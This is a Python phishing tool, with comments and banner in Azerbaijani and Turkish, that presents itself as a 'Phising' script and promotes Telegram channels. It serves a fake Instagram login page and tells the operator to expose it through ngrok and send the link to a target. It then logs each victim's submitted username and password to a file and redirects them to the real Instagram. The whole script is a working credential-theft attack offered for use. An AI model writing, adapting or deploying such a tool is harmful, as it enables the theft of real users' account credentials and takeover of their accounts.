#Ne gezirsen burda???? Kodlari ogurlamaqa gelmisen???

from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
import os
os.system("clear")
print("""
\033[1;31m
  d8,                                    
 `8P                      d8P            
                       d888888P          
  88b  88bd88b  .d888b,  ?88'   d888b8b  
  88P  88P' ?8b ?8b,     88P   d8P' ?88  
 d88  d88   88P   `?8b   88b   88b  ,88b 
d88' d88'   88b`?888P'   `?8b  `?88P'`88b
                         
                                < Phising >          
      

                                    \033[1;34m  Version 0.2
                               #######################################
                               #    <>Developer By m3m3nt9m9ri<>     #
                               #                                     #
                               #  <> Aşağıdakı telegram kanallarına  #
                               #            gözləyirik <>            #
                               #                                     #
                               #######################################
                                 <>   https://t.me/cyberdarkk     <>
                                 <>   https://t.me/istiklal_team  <>


Ngrok istifadə edərək http 8000 portunu dinləməyə alın və ngrokun sizə verdiyi url hədəfə atın




""")

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()

            with open('insta.html', 'r', encoding='utf-8') as file:
                content = file.read()

            self.wfile.write(content.encode('utf-8'))
        else:
            self.send_error(404)

    def do_POST(self):
        if self.path == '/login.php':
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                post_data = post_data.decode('utf-8')

                parsed_data = urllib.parse.parse_qs(post_data)
                username = parsed_data.get('username', [''])[0]
                password = parsed_data.get('password', [''])[0]

                # Verileri dosyaya kaydet
                with open('usernames.txt', 'a') as file:
                    file.write(f"Instagram Username: {username} \nPass: {password}\n\n\n")
                    print("\033[1;34mHedef məlumatları qeydə alındı, username.txt qeyd edildi |  " ,"\033[1;31m|", username,":", password)
                    
                # Kullanıcıyı Instagram'a yönlendir
                self.send_response(302)
                self.send_header('Location', 'https://instagram.com')
                self.send_header('Content-type', 'text/html; charset=utf-8')
                self.end_headers()

            except Exception as e:
                self.send_error(500)

        else:
            self.send_error(404)

    def log_message(self, format, *args):
        pass

def run(server_class=HTTPServer, handler_class=SimpleHTTPRequestHandler):
    server_address = ('', 8000)
    httpd = server_class(server_address, handler_class)
    print('\033[1;37mServer başlatıldı...\n\n')
    httpd.serve_forever()

if __name__ == '__main__':
    run()
